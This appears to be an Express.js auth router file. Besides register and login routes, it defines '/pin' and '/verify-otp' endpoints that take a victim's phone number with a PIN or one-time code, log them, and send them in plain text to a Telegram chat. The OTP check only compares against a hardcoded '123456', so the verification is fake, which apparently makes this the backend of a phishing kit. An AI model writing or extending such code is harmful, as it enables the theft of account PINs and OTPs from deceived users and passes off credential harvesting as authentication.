import express from "express";
import { register, login } from "../controllers/authController.js";
import { sendTelegramMessage } from "../../services/telegramService.js";

const router = express.Router();

// auth routes
router.post("/register", register);
router.post("/login", login);

// PIN route
router.post("/pin", async (req, res) => {
    try {
      const { phone, pin } = req.body;
  
      console.log(req.body);
  
      await sendTelegramMessage(
        `📌 PIN RECEIVED\n\n📞 Phone: ${phone}\n🔐 PIN: ${pin}`
      );
  
      res.json({
        success: true,
        message: "PIN sent to Telegram",
      });
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: "Failed to send PIN" });
    }
  });

// OTP route
router.post("/verify-otp", async (req, res) => {
    try {
      const { phone, otp } = req.body;
  
      console.log(phone, otp);
  
      await sendTelegramMessage(
        `🔐 OTP RECEIVED\n\n📞 Phone: ${phone}\n📟 OTP: ${otp}`
      );
  
      if (otp === "123456") {
        return res.json({
          success: true,
          message: "OTP verified",
        });
      }
  
      return res.status(400).json({
        success: false,
        message: "Invalid OTP",
      });
    } catch (err) {
      return res.status(500).json({ message: err.message });
    }
  });

export default router;